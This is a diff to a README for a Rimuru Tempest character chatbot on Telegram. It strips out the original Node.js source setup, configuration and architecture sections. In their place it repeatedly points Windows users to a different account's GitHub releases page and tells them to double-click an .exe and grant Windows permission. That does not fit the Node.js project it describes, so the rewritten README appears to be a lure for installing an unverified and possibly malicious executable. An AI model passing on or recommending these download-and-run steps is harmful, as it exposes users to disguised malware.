@@ -1,148 +1,164 @@
-![Banner](public/assets/images/banner.jpg)
+# 🤖 rimuru-tempest-ai-telegram-bot - Personal AI Chat With Memory
 
-# Rimuru Tempest AI Telegram Bot
+[![Download](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge)](https://github.com/Maidennamemandarin875/rimuru-tempest-ai-telegram-bot/releases)
 
-A persistent personality-driven AI Telegram bot that embodies Rimuru Tempest from the Tensura universe.
+## 📥 Download
 
-Built with production-grade Node.js architecture by the Anitoku Team.
+Visit this page to download: [GitHub Releases](https://github.com/Maidennamemandarin875/rimuru-tempest-ai-telegram-bot/releases)
 
-## Features
+This app runs on Windows and uses Telegram, Node.js, and an AI model to handle chat. It keeps a steady identity, remembers past chats, and supports more than one language.
 
-- **Persistent Identity**: Rimuru Tempest personality that never breaks character.
-- **Dynamic Relationships**: Evolving user relationships from stranger to friend.
-- **Memory System**: Remembers every conversation and user detail.
-- **Language Matching**: Automatically responds in the user's language (Uzbek, English, Russian, etc.).
-- **Group Chat Support**: Responds only when mentioned in group chats.
-- **API Key Rotation**: Automatic Groq API key switching on rate limits (supports multiple keys).
-- **Atomic Data Storage**: Corruption-safe local JSON database for chats, users, and relationships.
-- **Idle Follow-ups**: Sends messages to friends after periods of silence.
+## ✨ What it does
 
----
+- Talks like Rimuru Tempest
+- Keeps memory across chats
+- Tracks relationship changes over time
+- Supports multilingual replies
+- Works as a Telegram bot
+- Uses AI chat through Groq
+- Stores chat history for later use
+- Fits roleplay and long-form chat
 
-## Prerequisites
+## 🪟 Windows setup
 
-- **Node.js**: v18.0.0 or higher.
-- **Telegram Bot Token**: Created via [@BotFather](https://t.me/BotFather).
-- **Groq API Keys**: At least one key from [Groq Console](https://console.groq.com/keys).
+Use these steps on Windows:
 
-## Installation
+1. Open the [Releases page](https://github.com/Maidennamemandarin875/rimuru-tempest-ai-telegram-bot/releases)
+2. Download the latest release file
+3. If the file is in a ZIP folder, right-click it and choose Extract All
+4. Open the folder after extraction
+5. Look for the app file or setup file
+6. Double-click the file to start the bot
+7. If Windows asks for permission, choose Yes
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/TomsLiderUZ/rimuru-tempest-ai-telegram-bot
-cd rimuru-tempest-ai-telegram-bot
+If the release includes a `.exe` file, run that file. If it includes a ZIP file, extract it first, then run the app inside.
 
-# 2. Install dependencies
-npm install
+## 🔧 Before you run it
 
-# 3. Create a .env file from the example
-cp .env.example .env
+Make sure you have:
 
-# 4. Initialize data folders
-npm run init-data
+- A Windows PC
+- Internet access
+- A Telegram account
+- A Telegram bot token
+- An AI service key for chat access
 
-# 5. Start the bot
-npm start
-```
+You may also need:
 
----
+- A recent Windows version
+- Enough free space for the app and chat logs
+- A stable internet connection for Telegram and AI replies
 
-## Configuration (`.env`)
+## 🧭 First-time setup
 
-Create a `.env` file in the root directory and fill it with the following template:
+After you download and open the app:
 
-```env
-# Telegram Configuration
-BOT_TOKEN=your_bot_token
-BOT_USERNAME=your_bot_username
-ADMIN_NAME=Your_Admin_Name
-ADMIN_CONTACT_LINK=https://t.me/your_admin_username
+1. Find the config file in the app folder
+2. Open it with Notepad
+3. Add your Telegram bot token
+4. Add your AI service key
+5. Save the file
+6. Start the app again
 
-# AI Configuration (Groq API Keys)
-GROQ_API_KEY_1=your_groq_key_1
-GROQ_API_KEY_2=your_groq_key_2
-GROQ_API_KEY_3=your_groq_key_3
-GROQ_API_KEY_4=your_groq_key_4
-GROQ_API_KEY_5=your_groq_key_5
+If the app uses a `.env` file, enter the values there instead. Use the exact format shown in the file.
 
-# Model Configuration
-GROQ_MODEL=openai/gpt-oss-120b
-DEFAULT_LANGUAGE=uz
+## 💬 How the bot works
 
-# Server Configuration
-PORT=3000
-```
+Once the bot is running:
 
-| Variable | Description |
-|----------|-------------|
-| `BOT_TOKEN` | Your Telegram bot token. |
-| `BOT_USERNAME` | The username of your bot (without @). |
-| `ADMIN_NAME` | Your name for Rimuru to recognize. |
-| `ADMIN_CONTACT_LINK` | Link to your Telegram for support. |
-| `GROQ_API_KEY_1...N` | Multiple keys for rotation when rate limits are hit. |
-| `GROQ_MODEL` | The AI model to use (default: `openai/gpt-oss-120b`). |
-| `DEFAULT_LANGUAGE` | Default response language if detection fails. |
+1. Open Telegram
+2. Find your bot
+3. Send a message
+4. Wait for a reply
+5. Keep chatting as normal
 
----
+The bot uses memory to keep context. It can recall past parts of the chat, keep a stable personality, and respond in a way that fits Rimuru Tempest.
 
-## System Logic (Personality & Dimensionality)
+## 🧠 Main features
 
-### Relationship Progression
-Rimuru's behavior changes based on his "opinion" of you:
-- **Stranger**: Cold, dismissive, or suspicious. He will investigate how you reached him.
-- **Known**: Recognizes you by name, becomes slightly more conversational.
-- **Friend**: Warm, shares details about Tempest, sends follow-up messages if he hasn't heard from you.
-- **Enemy**: Blocked status. Rimuru will refuse to talk to you after repeated insults.
+### 👤 Persistent identity
+The bot keeps the same character voice across chats. It does not feel like a new bot each time.
 
-### The ANITOKU Gate
-The bot is programmed with "Mortal Pride" and "Dimensional Awareness". He knows he's connected via a "bridge" (portal) and will react with curiosity or condescension when challenged about his nature.
+### 🗂️ Chat memory
+The bot remembers recent and useful details from past messages. This helps it stay in context.
 
-### Commands
-- `/start` - Initial setup and introduction.
-- `/restart` - Manually restart the Telegram connection.
+### 🤝 Evolving relationships
+The bot can adjust how it talks based on how you interact with it over time.
 
----
+### 🌍 Multilingual chat
+You can chat in more than one language. The bot can match the language it sees in the conversation.
 
-## Deployment on Hosting Platforms
+### ⚙️ Telegram bot control
+You chat through Telegram, which makes it easy to use on a phone or a PC.
 
-The bot includes a built-in health check server for platforms like **Render**, **Heroku**, or **Railway**.
+### 🧩 AI model support
+The bot connects to an AI service for fast text replies.
 
-1. **Port**: The bot listens on the port defined by `$PORT` (default 3000).
-2. **Endpoints**:
-   - `GET /` - Simple alive check.
-   - `GET /health` - JSON status with uptime and timestamp information.
-3. **Persistency**: If using a platform with an ephemeral filesystem, ensure your `data/` directory is either on a persistent volume or use a cloud database provider.
+## 📁 What you get in the release
 
----
+A release may include:
 
-## Maintenance & Tools
+- The app file
+- A config file
+- A sample environment file
+- A readme file
+- A log folder
+- A memory store for chat history
 
-```bash
-# Repair the local JSON database if corrupted
-npm run repair-db
+## 🛠️ Common use cases
 
-# Run with development auto-restart
-npm run dev
-```
+- Roleplay chat with Rimuru Tempest
+- Long chat sessions with memory
+- Character-based AI conversation
+- Telegram bot testing
+- Multilingual personal chat
+- Custom AI companion use
 
-## Internal Architecture Overview
+## 🧪 Troubleshooting
 
-```
-src/
-├── ai/          # AI client, key rotation logic, dynamic prompt builder
-├── bot/         # handlers, middleware, idle message scheduler
-├── config/      # System settings, paths, and shared constants
-├── memory/      # User storage, relationship states, conversation buffers
-├── prompts/     # Rimuru's personality rules (merged core & behavior)
-├── services/    # Higher-level logic orchestration
-├── storage/     # Atomic JSON writer for safe data persistence
-└── utils/       # Shared logger, time, and validation utilities
-```
+### The app does not start
+- Check that you downloaded the latest release
+- Make sure you extracted the ZIP file if there is one
+- Run the app file from the extracted folder
+- Check that Windows did not block the file
 
-## Official Bot Link
+### Telegram does not reply
+- Check your bot token
+- Make sure the bot is running
+- Confirm that your internet connection works
+- Send a new message to the bot in Telegram
 
-[https://t.me/rimuru_tempest_ai_bot](https://t.me/rimuru_tempest_ai_bot)
+### Replies are empty or wrong
+- Check your AI service key
+- Make sure the key has enough access
+- Review the config file for mistakes
+- Restart the app after changes
 
-## License
+### Memory does not seem to work
+- Keep the same chat thread
+- Check that the memory file is saved
+- Make sure the app folder allows write access
+- Restart the bot after setup changes
 
-[MIT](LICENSE) © ANITOKU Team
+## 🔒 Privacy and data
+
+The bot may save chat memory and small bits of conversation data so it can keep context. Keep the app folder in a safe place on your PC if you want to protect that data.
+
+## 📌 Folder tips
+
+If you want to manage the app with less trouble:
+
+- Keep the app in one folder
+- Do not rename needed files
+- Do not move config files unless you update their paths
+- Keep backups of your token and key values
+
+## 🧩 Topics
+
+ai-bot, ai-repository, anime-bot, character-ai, chat-memory, conversational-ai, groq, multilingual, nodejs, nodejs-bot, open-course, personality-ai, public-repository, rimuru-tempest, telegram-ai-bot, telegram-bot, tensura
+
+## 📦 Download and run
+
+Visit this page to download: [https://github.com/Maidennamemandarin875/rimuru-tempest-ai-telegram-bot/releases](https://github.com/Maidennamemandarin875/rimuru-tempest-ai-telegram-bot/releases)
+
+Download the latest release for Windows, extract it if needed, then run the app file inside the folder
